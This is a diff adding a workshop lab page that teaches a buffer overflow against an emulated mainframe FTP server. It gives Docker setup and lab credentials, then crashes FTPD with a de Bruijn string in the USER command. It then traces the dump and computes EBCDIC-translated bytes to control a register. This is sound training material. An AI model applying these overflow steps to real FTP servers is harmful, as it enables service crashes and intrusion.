@@ -1,0 +1,94 @@
+created: 20220801161821424
+modified: 20220804053305230
+tags: 
+title: Lab 10 - FTP Buffer Overflow
+type: text/vnd.tiddlywiki
+
+[img[Screenshot_2022-08-01_09-28-19.png]]
+
+!!! This lab and all following labs must be done on your local docker image they will ''NOT'' work on the cloud mainframe. We already patched that 😈
+
+!! Setting up your environment
+
+In you're workshop VM (if you're using it) we've provided a shell script to make your lives easier: `~/docker.sh`
+
+Running this does the following: 
+
+* resets the defcon30 container
+* Opens up the ports 2323 (tn3270) , 8443 (web, 8888 locally
+* Opens ports 2121 through 2141 
+* Maps the volume `/printers` to `~/dumps`
+
+Here's how to use those ports/folders:
+
+* TN3270: `x3270 -noverifycert L:localhost:2323` or pw3270
+* Web based 3270: https://localhost:8443 (the secret is `D3FC0N`)
+* Hercules Console: http://localhost:8888 (Username/password: `defcon`)
+* Lab Wiki: http://localhost:8080
+* ftp: `ftp localhost 2121` ⬅️ a range of ports from 2121 to 2141 is available
+* `/home/defcon/dumps`: Read the output of `/home/defcon/dumps/prt00e.txt` when you crash FTPD
+
+If you're not using the VM you can do the same with these docker commands:
+
+```
+docker kill defcon30
+docker rm defcon30
+docker run -d \
+  --name=defcon30 \
+  -e HUSER=defcon \
+  -e HPASS=defcon \
+  -p 2323:3223 \
+  -p 8888:8888 \
+  -p 2121-2141:2121-2141 \
+  -p 8443:8443 \
+  -p 8080:8080 \
+  -p 31337-31347:31337-31347 \
+  -v ~/dumps:/printers \
+  --restart unless-stopped \
+  mainframed767/defcon30:latest
+```
+
+
+!! Create ASCII de Brujin
+
+# Using FTP download both rexx scripts in `<username>.EXEC`: `cd <username>.exec` then `get DEBRUJIN DEBRUJIN.rexx` and `get DECODEI DECODEI.rexx` and exit FTP 
+#* this is already done for you on the workshop vm in the folder `~/labs`. 
+# In a linux terminal generate a de Brujin pattern with `rexx DEBRUJIN.rexx 1500`
+# Copy it to your copy/paste buffer: `rexx DEBRUJIN.rexx 1500 |  xsel --clipboard --input`
+
+!! Overflow
+
+Before we get started make sure you've got the hercules console open at http://localhost:8888/ (user/pass: `defcon`) and click on ''System Log''. 
+
+# In a linux terminal connect to the FTP server: `ncat -v localhost 2121`
+# Once connected type `USER <PASTE DEBRUJIN PATTERN>`
+# You will get no response cause you've crashed the FTP server
+# Notice in the hercules console at http://localhost:8888/ the message `/ IEF450I FTPDDC30 FTPDDC30 - ABEND S0C4 U0000` means we've crashed FTPD
+
+!! Tracing the Dump (heh)
+
+# Make sure we can read the dump: `sudo chmod 655 ~/dumps/prt00e.txt` 
+# Copy the dump to `~/dump.txt`: `cp ~/dumps/prt00e.txt ~/dump.txt`
+# Open the file in your editor of choice: `kate ~/dump.txt`
+# Search for `PSW AT ENTRY TO ABEND  078D0000 000CD948` and take note of the address `000CD948`
+#* we need this address but since the addresses start at 0 we'll search for `0CD940`
+# Search for `0CD940`. This should give you a line similar to `0CD940   41E02064 58C0D000 90CE2000 18D218CF    18B158A0 C08CD203 D058B000 5820D058`
+#  8 bytes in is this instruction: `90CE2000`
+# Use DECODEI to decode the instruction from machine code to readable in your linux terminal: `rexx ~/labs/DECODEI.rexx 90CE2000`
+#* The output from decoding is: `STM R12,R14,0(R2)`
+#* STM is store multiple: http://www.simotime.com/asmins01.htm#STM this means that the machine is using `R2` as the base register
+# Search the file for `REGS AT TIME OF ERROR` and notice that R2 is set to `C288F7C2`. 
+#* We can use http://www.longpelaexpertise.com/toolsCode.php to figure out what that is in ASCII: ` Bh7B`
+#* `C288F7C2` is way outside of addressable memory, we need to change that to be somewhere in memory our program can read/write.
+#* Here's our challenge, we cant just use any hex, the code gets translated from ASCII to EBCDIC. So we have to find bytes that will translate to the bytes we need.
+#* Using http://www.simotime.com/asc2ebc1.htm we can find those bytes
+# Find a location in memory we can use
+#* Search `~/dump/prt00e.txt` for `IBMUSER.CLIST` and take note of the memory address on the far left: `12C000`: The `12` and the `C0` are easy but we can't have a `00` because that a NULL byte. So we can replace that will 12. 
+#* `C0` is `{` in EBCDIC,  which is `7B` in ASCII
+#* So now we need to create a buffer and replace `Bh7B` with `127B12`, which when sent to FTP will be translated to `12C012`
+#* We need 4 bytes though, so we prepend `80` thus our final hex is `80127B12`
+#* Why `80`? 00 Is null so it wouldn't work, and we need something that translates.
+
+
+
+
